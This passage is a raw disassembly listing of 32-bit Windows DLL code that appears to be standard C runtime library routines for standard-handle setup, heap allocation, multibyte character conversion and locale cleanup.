10005ed0:	83 f9 fe             	cmp    $0xfffffffe,%ecx
10005ed3:	74 3f                	je     0x10005f14
10005ed5:	8a 54 1f 04          	mov    0x4(%edi,%ebx,1),%dl
10005ed9:	f6 c2 01             	test   $0x1,%dl
10005edc:	74 36                	je     0x10005f14
10005ede:	f6 c2 08             	test   $0x8,%dl
10005ee1:	75 0b                	jne    0x10005eee
10005ee3:	51                   	push   %ecx
10005ee4:	ff 15 dc d0 00 10    	call   *0x1000d0dc
10005eea:	85 c0                	test   %eax,%eax
10005eec:	74 23                	je     0x10005f11
10005eee:	8b c7                	mov    %edi,%eax
10005ef0:	8b cf                	mov    %edi,%ecx
10005ef2:	83 e0 3f             	and    $0x3f,%eax
10005ef5:	c1 f9 06             	sar    $0x6,%ecx
10005ef8:	6b d0 38             	imul   $0x38,%eax,%edx
10005efb:	8b 45 fc             	mov    -0x4(%ebp),%eax
10005efe:	03 14 8d 40 43 01 10 	add    0x10014340(,%ecx,4),%edx
10005f05:	8b 00                	mov    (%eax),%eax
10005f07:	89 42 18             	mov    %eax,0x18(%edx)
10005f0a:	8a 44 1f 04          	mov    0x4(%edi,%ebx,1),%al
10005f0e:	88 42 28             	mov    %al,0x28(%edx)
10005f11:	8b 45 fc             	mov    -0x4(%ebp),%eax
10005f14:	47                   	inc    %edi
10005f15:	83 c0 04             	add    $0x4,%eax
10005f18:	89 45 fc             	mov    %eax,-0x4(%ebp)
10005f1b:	3b fe                	cmp    %esi,%edi
10005f1d:	75 aa                	jne    0x10005ec9
10005f1f:	5f                   	pop    %edi
10005f20:	5e                   	pop    %esi
10005f21:	5b                   	pop    %ebx
10005f22:	c9                   	leave
10005f23:	c3                   	ret
10005f24:	8b ff                	mov    %edi,%edi
10005f26:	53                   	push   %ebx
10005f27:	56                   	push   %esi
10005f28:	57                   	push   %edi
10005f29:	33 ff                	xor    %edi,%edi
10005f2b:	8b c7                	mov    %edi,%eax
10005f2d:	8b cf                	mov    %edi,%ecx
10005f2f:	83 e0 3f             	and    $0x3f,%eax
10005f32:	c1 f9 06             	sar    $0x6,%ecx
10005f35:	6b f0 38             	imul   $0x38,%eax,%esi
10005f38:	03 34 8d 40 43 01 10 	add    0x10014340(,%ecx,4),%esi
10005f3f:	83 7e 18 ff          	cmpl   $0xffffffff,0x18(%esi)
10005f43:	74 0c                	je     0x10005f51
10005f45:	83 7e 18 fe          	cmpl   $0xfffffffe,0x18(%esi)
10005f49:	74 06                	je     0x10005f51
10005f4b:	80 4e 28 80          	orb    $0x80,0x28(%esi)
10005f4f:	eb 79                	jmp    0x10005fca
10005f51:	8b c7                	mov    %edi,%eax
10005f53:	c6 46 28 81          	movb   $0x81,0x28(%esi)
10005f57:	83 e8 00             	sub    $0x0,%eax
10005f5a:	74 10                	je     0x10005f6c
10005f5c:	83 e8 01             	sub    $0x1,%eax
10005f5f:	74 07                	je     0x10005f68
10005f61:	83 e8 01             	sub    $0x1,%eax
10005f64:	6a f4                	push   $0xfffffff4
10005f66:	eb 06                	jmp    0x10005f6e
10005f68:	6a f5                	push   $0xfffffff5
10005f6a:	eb 02                	jmp    0x10005f6e
10005f6c:	6a f6                	push   $0xfffffff6
10005f6e:	58                   	pop    %eax
10005f6f:	50                   	push   %eax
10005f70:	ff 15 30 d0 00 10    	call   *0x1000d030
10005f76:	8b d8                	mov    %eax,%ebx
10005f78:	83 fb ff             	cmp    $0xffffffff,%ebx
10005f7b:	74 0d                	je     0x10005f8a
10005f7d:	85 db                	test   %ebx,%ebx
10005f7f:	74 09                	je     0x10005f8a
10005f81:	53                   	push   %ebx
10005f82:	ff 15 dc d0 00 10    	call   *0x1000d0dc
10005f88:	eb 02                	jmp    0x10005f8c
10005f8a:	33 c0                	xor    %eax,%eax
10005f8c:	85 c0                	test   %eax,%eax
10005f8e:	74 1c                	je     0x10005fac
10005f90:	0f b6 c0             	movzbl %al,%eax
10005f93:	89 5e 18             	mov    %ebx,0x18(%esi)
10005f96:	83 f8 02             	cmp    $0x2,%eax
10005f99:	75 06                	jne    0x10005fa1
10005f9b:	80 4e 28 40          	orb    $0x40,0x28(%esi)
10005f9f:	eb 29                	jmp    0x10005fca
10005fa1:	83 f8 03             	cmp    $0x3,%eax
10005fa4:	75 24                	jne    0x10005fca
10005fa6:	80 4e 28 08          	orb    $0x8,0x28(%esi)
10005faa:	eb 1e                	jmp    0x10005fca
10005fac:	80 4e 28 40          	orb    $0x40,0x28(%esi)
10005fb0:	c7 46 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%esi)
10005fb7:	a1 1c 41 01 10       	mov    0x1001411c,%eax
10005fbc:	85 c0                	test   %eax,%eax
10005fbe:	74 0a                	je     0x10005fca
10005fc0:	8b 04 b8             	mov    (%eax,%edi,4),%eax
10005fc3:	c7 40 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%eax)
10005fca:	47                   	inc    %edi
10005fcb:	83 ff 03             	cmp    $0x3,%edi
10005fce:	0f 85 57 ff ff ff    	jne    0x10005f2b
10005fd4:	5f                   	pop    %edi
10005fd5:	5e                   	pop    %esi
10005fd6:	5b                   	pop    %ebx
10005fd7:	c3                   	ret
10005fd8:	6a 0c                	push   $0xc
10005fda:	68 78 24 01 10       	push   $0x10012478
10005fdf:	e8 bc c6 ff ff       	call   0x100026a0
10005fe4:	6a 07                	push   $0x7
10005fe6:	e8 41 09 00 00       	call   0x1000692c
10005feb:	59                   	pop    %ecx
10005fec:	33 db                	xor    %ebx,%ebx
10005fee:	88 5d e7             	mov    %bl,-0x19(%ebp)
10005ff1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10005ff4:	53                   	push   %ebx
10005ff5:	e8 3f 30 00 00       	call   0x10009039
10005ffa:	59                   	pop    %ecx
10005ffb:	85 c0                	test   %eax,%eax
10005ffd:	75 0f                	jne    0x1000600e
10005fff:	e8 6a fe ff ff       	call   0x10005e6e
10006004:	e8 1b ff ff ff       	call   0x10005f24
10006009:	b3 01                	mov    $0x1,%bl
1000600b:	88 5d e7             	mov    %bl,-0x19(%ebp)
1000600e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10006015:	e8 15 00 00 00       	call   0x1000602f
1000601a:	8a c3                	mov    %bl,%al
1000601c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000601f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10006026:	59                   	pop    %ecx
10006027:	5f                   	pop    %edi
10006028:	5e                   	pop    %esi
10006029:	5b                   	pop    %ebx
1000602a:	c9                   	leave
1000602b:	c3                   	ret
1000602c:	8a 5d e7             	mov    -0x19(%ebp),%bl
1000602f:	6a 07                	push   $0x7
10006031:	e8 3e 09 00 00       	call   0x10006974
10006036:	59                   	pop    %ecx
10006037:	c3                   	ret
10006038:	8b ff                	mov    %edi,%edi
1000603a:	56                   	push   %esi
1000603b:	33 f6                	xor    %esi,%esi
1000603d:	8b 86 40 43 01 10    	mov    0x10014340(%esi),%eax
10006043:	85 c0                	test   %eax,%eax
10006045:	74 0e                	je     0x10006055
10006047:	50                   	push   %eax
10006048:	e8 b7 2f 00 00       	call   0x10009004
1000604d:	83 a6 40 43 01 10 00 	andl   $0x0,0x10014340(%esi)
10006054:	59                   	pop    %ecx
10006055:	83 c6 04             	add    $0x4,%esi
10006058:	81 fe 00 02 00 00    	cmp    $0x200,%esi
1000605e:	72 dd                	jb     0x1000603d
10006060:	b0 01                	mov    $0x1,%al
10006062:	5e                   	pop    %esi
10006063:	c3                   	ret
10006064:	8b ff                	mov    %edi,%edi
10006066:	55                   	push   %ebp
10006067:	8b ec                	mov    %esp,%ebp
10006069:	56                   	push   %esi
1000606a:	8b 75 08             	mov    0x8(%ebp),%esi
1000606d:	83 fe e0             	cmp    $0xffffffe0,%esi
10006070:	77 30                	ja     0x100060a2
10006072:	85 f6                	test   %esi,%esi
10006074:	75 17                	jne    0x1000608d
10006076:	46                   	inc    %esi
10006077:	eb 14                	jmp    0x1000608d
10006079:	e8 21 22 00 00       	call   0x1000829f
1000607e:	85 c0                	test   %eax,%eax
10006080:	74 20                	je     0x100060a2
10006082:	56                   	push   %esi
10006083:	e8 d4 e4 ff ff       	call   0x1000455c
10006088:	59                   	pop    %ecx
10006089:	85 c0                	test   %eax,%eax
1000608b:	74 15                	je     0x100060a2
1000608d:	56                   	push   %esi
1000608e:	6a 00                	push   $0x0
10006090:	ff 35 e0 46 01 10    	push   0x100146e0
10006096:	ff 15 d0 d0 00 10    	call   *0x1000d0d0
1000609c:	85 c0                	test   %eax,%eax
1000609e:	74 d9                	je     0x10006079
100060a0:	eb 0d                	jmp    0x100060af
100060a2:	e8 6f f5 ff ff       	call   0x10005616
100060a7:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
100060ad:	33 c0                	xor    %eax,%eax
100060af:	5e                   	pop    %esi
100060b0:	5d                   	pop    %ebp
100060b1:	c3                   	ret
100060b2:	8b ff                	mov    %edi,%edi
100060b4:	55                   	push   %ebp
100060b5:	8b ec                	mov    %esp,%ebp
100060b7:	83 ec 10             	sub    $0x10,%esp
100060ba:	53                   	push   %ebx
100060bb:	57                   	push   %edi
100060bc:	8b 7d 0c             	mov    0xc(%ebp),%edi
100060bf:	85 ff                	test   %edi,%edi
100060c1:	0f 84 19 01 00 00    	je     0x100061e0
100060c7:	8b 5d 10             	mov    0x10(%ebp),%ebx
100060ca:	85 db                	test   %ebx,%ebx
100060cc:	0f 84 0e 01 00 00    	je     0x100061e0
100060d2:	80 3f 00             	cmpb   $0x0,(%edi)
100060d5:	75 15                	jne    0x100060ec
100060d7:	8b 45 08             	mov    0x8(%ebp),%eax
100060da:	85 c0                	test   %eax,%eax
100060dc:	0f 84 0c 01 00 00    	je     0x100061ee
100060e2:	33 c9                	xor    %ecx,%ecx
100060e4:	66 89 08             	mov    %cx,(%eax)
100060e7:	e9 02 01 00 00       	jmp    0x100061ee
100060ec:	56                   	push   %esi
100060ed:	ff 75 14             	push   0x14(%ebp)
100060f0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
100060f3:	e8 e8 e1 ff ff       	call   0x100042e0
100060f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
100060fb:	81 78 08 e9 fd 00 00 	cmpl   $0xfde9,0x8(%eax)
10006102:	75 21                	jne    0x10006125
10006104:	68 44 45 01 10       	push   $0x10014544
10006109:	53                   	push   %ebx
1000610a:	57                   	push   %edi
1000610b:	ff 75 08             	push   0x8(%ebp)
1000610e:	e8 6b 31 00 00       	call   0x1000927e
10006113:	8b f0                	mov    %eax,%esi
10006115:	83 c4 10             	add    $0x10,%esp
10006118:	85 f6                	test   %esi,%esi
1000611a:	0f 89 ab 00 00 00    	jns    0x100061cb
10006120:	e9 a3 00 00 00       	jmp    0x100061c8
10006125:	83 b8 a8 00 00 00 00 	cmpl   $0x0,0xa8(%eax)
1000612c:	75 15                	jne    0x10006143
1000612e:	8b 4d 08             	mov    0x8(%ebp),%ecx
10006131:	85 c9                	test   %ecx,%ecx
10006133:	74 06                	je     0x1000613b
10006135:	0f b6 07             	movzbl (%edi),%eax
10006138:	66 89 01             	mov    %ax,(%ecx)
1000613b:	33 f6                	xor    %esi,%esi
1000613d:	46                   	inc    %esi
1000613e:	e9 88 00 00 00       	jmp    0x100061cb
10006143:	8d 45 f4             	lea    -0xc(%ebp),%eax
10006146:	50                   	push   %eax
10006147:	0f b6 07             	movzbl (%edi),%eax
1000614a:	50                   	push   %eax
1000614b:	e8 c8 30 00 00       	call   0x10009218
10006150:	59                   	pop    %ecx
10006151:	59                   	pop    %ecx
10006152:	85 c0                	test   %eax,%eax
10006154:	74 42                	je     0x10006198
10006156:	8b 75 f4             	mov    -0xc(%ebp),%esi
10006159:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
1000615d:	7e 29                	jle    0x10006188
1000615f:	3b 5e 04             	cmp    0x4(%esi),%ebx
10006162:	7c 27                	jl     0x1000618b
10006164:	33 c0                	xor    %eax,%eax
10006166:	39 45 08             	cmp    %eax,0x8(%ebp)
10006169:	0f 95 c0             	setne  %al
1000616c:	50                   	push   %eax
1000616d:	ff 75 08             	push   0x8(%ebp)
10006170:	ff 76 04             	push   0x4(%esi)
10006173:	57                   	push   %edi
10006174:	6a 09                	push   $0x9
10006176:	ff 76 08             	push   0x8(%esi)
10006179:	e8 88 1a 00 00       	call   0x10007c06
1000617e:	8b 75 f4             	mov    -0xc(%ebp),%esi
10006181:	83 c4 18             	add    $0x18,%esp
10006184:	85 c0                	test   %eax,%eax
10006186:	75 0b                	jne    0x10006193
10006188:	3b 5e 04             	cmp    0x4(%esi),%ebx
1000618b:	72 30                	jb     0x100061bd
1000618d:	80 7f 01 00          	cmpb   $0x0,0x1(%edi)
10006191:	74 2a                	je     0x100061bd
10006193:	8b 76 04             	mov    0x4(%esi),%esi
10006196:	eb 33                	jmp    0x100061cb
10006198:	33 c0                	xor    %eax,%eax
1000619a:	39 45 08             	cmp    %eax,0x8(%ebp)
1000619d:	0f 95 c0             	setne  %al
100061a0:	33 f6                	xor    %esi,%esi
100061a2:	50                   	push   %eax
100061a3:	ff 75 08             	push   0x8(%ebp)
100061a6:	8b 45 f4             	mov    -0xc(%ebp),%eax
100061a9:	46                   	inc    %esi
100061aa:	56                   	push   %esi
100061ab:	57                   	push   %edi
100061ac:	6a 09                	push   $0x9
100061ae:	ff 70 08             	push   0x8(%eax)
100061b1:	e8 50 1a 00 00       	call   0x10007c06
100061b6:	83 c4 18             	add    $0x18,%esp
100061b9:	85 c0                	test   %eax,%eax
100061bb:	75 0e                	jne    0x100061cb
100061bd:	e8 54 f4 ff ff       	call   0x10005616
100061c2:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
100061c8:	83 ce ff             	or     $0xffffffff,%esi
100061cb:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
100061cf:	74 0a                	je     0x100061db
100061d1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100061d4:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
100061db:	8b c6                	mov    %esi,%eax
100061dd:	5e                   	pop    %esi
100061de:	eb 10                	jmp    0x100061f0
100061e0:	83 25 44 45 01 10 00 	andl   $0x0,0x10014544
100061e7:	83 25 48 45 01 10 00 	andl   $0x0,0x10014548
100061ee:	33 c0                	xor    %eax,%eax
100061f0:	5f                   	pop    %edi
100061f1:	5b                   	pop    %ebx
100061f2:	c9                   	leave
100061f3:	c3                   	ret
100061f4:	8b ff                	mov    %edi,%edi
100061f6:	55                   	push   %ebp
100061f7:	8b ec                	mov    %esp,%ebp
100061f9:	6a 00                	push   $0x0
100061fb:	ff 75 10             	push   0x10(%ebp)
100061fe:	ff 75 0c             	push   0xc(%ebp)
10006201:	ff 75 08             	push   0x8(%ebp)
10006204:	e8 a9 fe ff ff       	call   0x100060b2
10006209:	83 c4 10             	add    $0x10,%esp
1000620c:	5d                   	pop    %ebp
1000620d:	c3                   	ret
1000620e:	6a 08                	push   $0x8
10006210:	68 98 24 01 10       	push   $0x10012498
10006215:	e8 86 c4 ff ff       	call   0x100026a0
1000621a:	8b 45 08             	mov    0x8(%ebp),%eax
1000621d:	ff 30                	push   (%eax)
1000621f:	e8 08 07 00 00       	call   0x1000692c
10006224:	59                   	pop    %ecx
10006225:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10006229:	8b 45 0c             	mov    0xc(%ebp),%eax
1000622c:	8b 00                	mov    (%eax),%eax
1000622e:	8b 00                	mov    (%eax),%eax
10006230:	8b 40 48             	mov    0x48(%eax),%eax
10006233:	f0 ff 00             	lock incl (%eax)
10006236:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
1000623d:	e8 12 00 00 00       	call   0x10006254
10006242:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006245:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000624c:	59                   	pop    %ecx
1000624d:	5f                   	pop    %edi
1000624e:	5e                   	pop    %esi
1000624f:	5b                   	pop    %ebx
10006250:	c9                   	leave
10006251:	c2 0c 00             	ret    $0xc
10006254:	8b 45 10             	mov    0x10(%ebp),%eax
10006257:	ff 30                	push   (%eax)
10006259:	e8 16 07 00 00       	call   0x10006974
1000625e:	59                   	pop    %ecx
1000625f:	c3                   	ret
10006260:	6a 08                	push   $0x8
10006262:	68 d8 24 01 10       	push   $0x100124d8
10006267:	e8 34 c4 ff ff       	call   0x100026a0
1000626c:	8b 45 08             	mov    0x8(%ebp),%eax
1000626f:	ff 30                	push   (%eax)
10006271:	e8 b6 06 00 00       	call   0x1000692c
10006276:	59                   	pop    %ecx
10006277:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000627b:	8b 45 0c             	mov    0xc(%ebp),%eax
1000627e:	8b 00                	mov    (%eax),%eax
10006280:	8b 00                	mov    (%eax),%eax
10006282:	8b 48 48             	mov    0x48(%eax),%ecx
10006285:	85 c9                	test   %ecx,%ecx
10006287:	74 18                	je     0x100062a1
10006289:	83 c8 ff             	or     $0xffffffff,%eax
1000628c:	f0 0f c1 01          	lock xadd %eax,(%ecx)
10006290:	75 0f                	jne    0x100062a1
10006292:	81 f9 d8 31 01 10    	cmp    $0x100131d8,%ecx
10006298:	74 07                	je     0x100062a1
1000629a:	51                   	push   %ecx
1000629b:	e8 e6 f3 ff ff       	call   0x10005686
100062a0:	59                   	pop    %ecx
100062a1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100062a8:	e8 12 00 00 00       	call   0x100062bf
100062ad:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100062b0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100062b7:	59                   	pop    %ecx
100062b8:	5f                   	pop    %edi
100062b9:	5e                   	pop    %esi
100062ba:	5b                   	pop    %ebx
100062bb:	c9                   	leave
100062bc:	c2 0c 00             	ret    $0xc
100062bf:	8b 45 10             	mov    0x10(%ebp),%eax
100062c2:	ff 30                	push   (%eax)
100062c4:	e8 ab 06 00 00       	call   0x10006974
100062c9:	59                   	pop    %ecx
100062ca:	c3                   	ret
100062cb:	6a 08                	push   $0x8
100062cd:	68 f8 24 01 10       	push   $0x100124f8
100062d2:	e8 c9 c3 ff ff       	call   0x100026a0
100062d7:	8b 45 08             	mov    0x8(%ebp),%eax
100062da:	ff 30                	push   (%eax)
100062dc:	e8 4b 06 00 00       	call   0x1000692c
100062e1:	59                   	pop    %ecx
100062e2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100062e6:	6a 00                	push   $0x0
100062e8:	8b 45 0c             	mov    0xc(%ebp),%eax
100062eb:	8b 00                	mov    (%eax),%eax
100062ed:	ff 30                	push   (%eax)
100062ef:	e8 0d 02 00 00       	call   0x10006501
100062f4:	59                   	pop    %ecx
100062f5:	59                   	pop    %ecx
100062f6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100062fd:	e8 12 00 00 00       	call   0x10006314
10006302:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006305:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000630c:	59                   	pop    %ecx
1000630d:	5f                   	pop    %edi
1000630e:	5e                   	pop    %esi
1000630f:	5b                   	pop    %ebx
10006310:	c9                   	leave
10006311:	c2 0c 00             	ret    $0xc
10006314:	8b 45 10             	mov    0x10(%ebp),%eax
10006317:	ff 30                	push   (%eax)
10006319:	e8 56 06 00 00       	call   0x10006974
1000631e:	59                   	pop    %ecx
1000631f:	c3                   	ret
10006320:	6a 08                	push   $0x8
10006322:	68 b8 24 01 10       	push   $0x100124b8
10006327:	e8 74 c3 ff ff       	call   0x100026a0
1000632c:	8b 45 08             	mov    0x8(%ebp),%eax
1000632f:	ff 30                	push   (%eax)
10006331:	e8 f6 05 00 00       	call   0x1000692c
10006336:	59                   	pop    %ecx
10006337:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000633b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000633e:	8b 41 04             	mov    0x4(%ecx),%eax
10006341:	8b 00                	mov    (%eax),%eax
10006343:	ff 30                	push   (%eax)
10006345:	8b 01                	mov    (%ecx),%eax
10006347:	ff 30                	push   (%eax)
10006349:	e8 b3 01 00 00       	call   0x10006501
1000634e:	59                   	pop    %ecx
1000634f:	59                   	pop    %ecx
10006350:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
10006357:	e8 12 00 00 00       	call   0x1000636e
1000635c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000635f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10006366:	59                   	pop    %ecx
10006367:	5f                   	pop    %edi
10006368:	5e                   	pop    %esi
10006369:	5b                   	pop    %ebx
1000636a:	c9                   	leave
1000636b:	c2 0c 00             	ret    $0xc
1000636e:	8b 45 10             	mov    0x10(%ebp),%eax
10006371:	ff 30                	push   (%eax)
10006373:	e8 fc 05 00 00       	call   0x10006974
10006378:	59                   	pop    %ecx
10006379:	c3                   	ret
1000637a:	8b ff                	mov    %edi,%edi
1000637c:	55                   	push   %ebp
1000637d:	8b ec                	mov    %esp,%ebp
1000637f:	83 ec 14             	sub    $0x14,%esp
10006382:	8b 45 08             	mov    0x8(%ebp),%eax
10006385:	33 c9                	xor    %ecx,%ecx
10006387:	41                   	inc    %ecx
10006388:	6a 43                	push   $0x43
1000638a:	89 48 18             	mov    %ecx,0x18(%eax)
1000638d:	8b 45 08             	mov    0x8(%ebp),%eax
10006390:	c7 00 d0 dc 00 10    	movl   $0x1000dcd0,(%eax)
10006396:	8b 45 08             	mov    0x8(%ebp),%eax
10006399:	89 88 50 03 00 00    	mov    %ecx,0x350(%eax)
1000639f:	8b 45 08             	mov    0x8(%ebp),%eax
100063a2:	59                   	pop    %ecx
100063a3:	6a 05                	push   $0x5
100063a5:	c7 40 48 d8 31 01 10 	movl   $0x100131d8,0x48(%eax)
100063ac:	8b 45 08             	mov    0x8(%ebp),%eax
100063af:	66 89 48 6c          	mov    %cx,0x6c(%eax)
100063b3:	8b 45 08             	mov    0x8(%ebp),%eax
100063b6:	66 89 88 72 01 00 00 	mov    %cx,0x172(%eax)
100063bd:	8d 4d ff             	lea    -0x1(%ebp),%ecx
100063c0:	8b 45 08             	mov    0x8(%ebp),%eax
100063c3:	83 a0 4c 03 00 00 00 	andl   $0x0,0x34c(%eax)
100063ca:	8d 45 08             	lea    0x8(%ebp),%eax
100063cd:	89 45 f0             	mov    %eax,-0x10(%ebp)
100063d0:	58                   	pop    %eax
100063d1:	89 45 f8             	mov    %eax,-0x8(%ebp)
100063d4:	89 45 ec             	mov    %eax,-0x14(%ebp)
100063d7:	8d 45 f8             	lea    -0x8(%ebp),%eax
100063da:	50                   	push   %eax
100063db:	8d 45 f0             	lea    -0x10(%ebp),%eax
100063de:	50                   	push   %eax
100063df:	8d 45 ec             	lea    -0x14(%ebp),%eax
100063e2:	50                   	push   %eax
100063e3:	e8 26 fe ff ff       	call   0x1000620e
100063e8:	8d 45 08             	lea    0x8(%ebp),%eax
100063eb:	89 45 f4             	mov    %eax,-0xc(%ebp)
100063ee:	8d 4d ff             	lea    -0x1(%ebp),%ecx
100063f1:	6a 04                	push   $0x4
100063f3:	8d 45 0c             	lea    0xc(%ebp),%eax
100063f6:	89 45 f8             	mov    %eax,-0x8(%ebp)
100063f9:	58                   	pop    %eax
100063fa:	89 45 ec             	mov    %eax,-0x14(%ebp)
100063fd:	89 45 f0             	mov    %eax,-0x10(%ebp)
10006400:	8d 45 ec             	lea    -0x14(%ebp),%eax
10006403:	50                   	push   %eax
10006404:	8d 45 f4             	lea    -0xc(%ebp),%eax
10006407:	50                   	push   %eax
10006408:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000640b:	50                   	push   %eax
1000640c:	e8 0f ff ff ff       	call   0x10006320
10006411:	c9                   	leave
10006412:	c3                   	ret
10006413:	8b ff                	mov    %edi,%edi
10006415:	55                   	push   %ebp
10006416:	8b ec                	mov    %esp,%ebp
10006418:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000641c:	74 12                	je     0x10006430
1000641e:	ff 75 08             	push   0x8(%ebp)
10006421:	e8 0e 00 00 00       	call   0x10006434
10006426:	ff 75 08             	push   0x8(%ebp)
10006429:	e8 58 f2 ff ff       	call   0x10005686
1000642e:	59                   	pop    %ecx
1000642f:	59                   	pop    %ecx
10006430:	5d                   	pop    %ebp
10006431:	c2 04 00             	ret    $0x4
10006434:	8b ff                	mov    %edi,%edi
10006436:	55                   	push   %ebp
10006437:	8b ec                	mov    %esp,%ebp
10006439:	8b 45 08             	mov    0x8(%ebp),%eax
1000643c:	83 ec 10             	sub    $0x10,%esp
1000643f:	8b 08                	mov    (%eax),%ecx
10006441:	81 f9 d0 dc 00 10    	cmp    $0x1000dcd0,%ecx
10006447:	74 0a                	je     0x10006453
10006449:	51                   	push   %ecx
1000644a:	e8 37 f2 ff ff       	call   0x10005686
1000644f:	8b 45 08             	mov    0x8(%ebp),%eax
10006452:	59                   	pop    %ecx
10006453:	ff 70 3c             	push   0x3c(%eax)
10006456:	e8 2b f2 ff ff       	call   0x10005686
1000645b:	8b 45 08             	mov    0x8(%ebp),%eax
1000645e:	ff 70 30             	push   0x30(%eax)
10006461:	e8 20 f2 ff ff       	call   0x10005686
10006466:	8b 45 08             	mov    0x8(%ebp),%eax
10006469:	ff 70 34             	push   0x34(%eax)
1000646c:	e8 15 f2 ff ff       	call   0x10005686
10006471:	8b 45 08             	mov    0x8(%ebp),%eax
10006474:	ff 70 38             	push   0x38(%eax)
10006477:	e8 0a f2 ff ff       	call   0x10005686
1000647c:	8b 45 08             	mov    0x8(%ebp),%eax
1000647f:	ff 70 28             	push   0x28(%eax)
10006482:	e8 ff f1 ff ff       	call   0x10005686
10006487:	8b 45 08             	mov    0x8(%ebp),%eax
1000648a:	ff 70 2c             	push   0x2c(%eax)
1000648d:	e8 f4 f1 ff ff       	call   0x10005686
10006492:	8b 45 08             	mov    0x8(%ebp),%eax
10006495:	ff 70 40             	push   0x40(%eax)
10006498:	e8 e9 f1 ff ff       	call   0x10005686
1000649d:	8b 45 08             	mov    0x8(%ebp),%eax
100064a0:	ff 70 44             	push   0x44(%eax)
100064a3:	e8 de f1 ff ff       	call   0x10005686
100064a8:	8b 45 08             	mov    0x8(%ebp),%eax
100064ab:	ff b0 60 03 00 00    	push   0x360(%eax)
100064b1:	e8 d0 f1 ff ff       	call   0x10005686
100064b6:	83 c4 24             	add    $0x24,%esp
100064b9:	8d 45 08             	lea    0x8(%ebp),%eax
100064bc:	89 45 f4             	mov    %eax,-0xc(%ebp)
100064bf:	8d 4d ff             	lea    -0x1(%ebp),%ecx
100064c2:	6a 05                	push   $0x5
100064c4:	58                   	pop    %eax
100064c5:	89 45 f8             	mov    %eax,-0x8(%ebp)
100064c8:	89 45 f0             	mov    %eax,-0x10(%ebp)
100064cb:	8d 45 f8             	lea    -0x8(%ebp),%eax
100064ce:	50                   	push   %eax
100064cf:	8d 45 f4             	lea    -0xc(%ebp),%eax
100064d2:	50                   	push   %eax
100064d3:	8d 45 f0             	lea    -0x10(%ebp),%eax
100064d6:	50                   	push   %eax
100064d7:	e8 84 fd ff ff       	call   0x10006260
100064dc:	6a 04                	push   $0x4
100064de:	8d 45 08             	lea    0x8(%ebp),%eax
100064e1:	89 45 f4             	mov    %eax,-0xc(%ebp)
100064e4:	8d 4d ff             	lea    -0x1(%ebp),%ecx
100064e7:	58                   	pop    %eax
100064e8:	89 45 f0             	mov    %eax,-0x10(%ebp)
100064eb:	89 45 f8             	mov    %eax,-0x8(%ebp)
100064ee:	8d 45 f0             	lea    -0x10(%ebp),%eax
100064f1:	50                   	push   %eax
100064f2:	8d 45 f4             	lea    -0xc(%ebp),%eax
100064f5:	50                   	push   %eax
100064f6:	8d 45 f8             	lea    -0x8(%ebp),%eax
100064f9:	50                   	push   %eax
100064fa:	e8 cc fd ff ff       	call   0x100062cb
100064ff:	c9                   	leave
10006500:	c3                   	ret
10006501:	8b ff                	mov    %edi,%edi
10006503:	55                   	push   %ebp
10006504:	8b ec                	mov    %esp,%ebp
10006506:	56                   	push   %esi
10006507:	8b 75 08             	mov    0x8(%ebp),%esi
1000650a:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
1000650e:	74 28                	je     0x10006538
10006510:	ff 76 4c             	push   0x4c(%esi)
10006513:	e8 08 31 00 00       	call   0x10009620
10006518:	8b 46 4c             	mov    0x4c(%esi),%eax
1000651b:	59                   	pop    %ecx
1000651c:	3b 05 58 45 01 10    	cmp    0x10014558,%eax
10006522:	74 14                	je     0x10006538
10006524:	3d 10 31 01 10       	cmp    $0x10013110,%eax
10006529:	74 0d                	je     0x10006538
1000652b:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
1000652f:	75 07                	jne    0x10006538
10006531:	50                   	push   %eax
10006532:	e8 1e 2f 00 00       	call   0x10009455
10006537:	59                   	pop    %ecx
10006538:	8b 45 0c             	mov    0xc(%ebp),%eax
1000653b:	89 46 4c             	mov    %eax,0x4c(%esi)
1000653e:	5e                   	pop    %esi
1000653f:	85 c0                	test   %eax,%eax
10006541:	74 07                	je     0x1000654a
10006543:	50                   	push   %eax
10006544:	e8 8f 2e 00 00       	call   0x100093d8
10006549:	59                   	pop    %ecx
1000654a:	5d                   	pop    %ebp
1000654b:	c3                   	ret
1000654c:	a1 08 31 01 10       	mov    0x10013108,%eax
10006551:	83 f8 ff             	cmp    $0xffffffff,%eax
10006554:	74 21                	je     0x10006577
10006556:	56                   	push   %esi
10006557:	50                   	push   %eax
10006558:	e8 d8 f3 ff ff       	call   0x10005935
